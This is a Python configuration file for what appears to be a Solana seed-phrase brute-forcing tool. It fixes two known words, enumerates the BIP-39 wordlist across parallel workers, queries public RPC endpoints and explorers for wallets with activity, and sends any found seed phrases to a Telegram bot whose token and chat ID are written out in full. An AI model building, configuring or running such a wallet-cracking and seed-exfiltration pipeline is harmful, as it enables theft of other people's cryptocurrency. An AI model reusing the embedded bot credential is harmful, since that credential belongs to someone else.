import json

with open("words.json", "r") as f:
    WORDS_CONFIG = json.load(f)

CONFIG = {
    # Known words (positions 1 and 2)
    "known_words": {
        0: "mammal",  # Position 1
        1: "fish"     # Position 2
    },
    
    # Wordlist configuration
    "bip39_wordlist": True,      # Use full BIP-39 wordlist
    "common_words": WORDS_CONFIG["common_words"],
    
    # Updated RPC endpoints (tested and working)
    "rpc_endpoints": [
        "https://api.mainnet-beta.solana.com",
        "https://solana.genesysgo.net",
        "https://solana-api.projectserum.com",
        "https://rpc.ankr.com/solana",
        "https://ssc-dao.genesysgo.net"
    ],
    
    # Blockchain explorers
    "explorers": [
        "https://api.solscan.io/account/",
        "https://public-api.solscan.io/account/"
    ],
    
    # Telegram Notification
    "telegram": {
        "bot_token": "8461028954:AAHuVaNA6RqWVFeMeqcTKmnnqpVOPA5rn2I",
        "chat_id": "1305203741"
    },
    
    # Optimized settings
    "max_workers": 24,           # Reduced for stability
    "batch_size": 100,           # Smaller batches
    "timeout": 30,              # Longer timeout
    "retry_rpc": 2,             # Fewer retries
    
    # Notification settings
    "notify_empty_tx": True,    # Notify wallets with tx but 0 balance
    "notify_with_seed": True    # Include seed phrase in notifications
}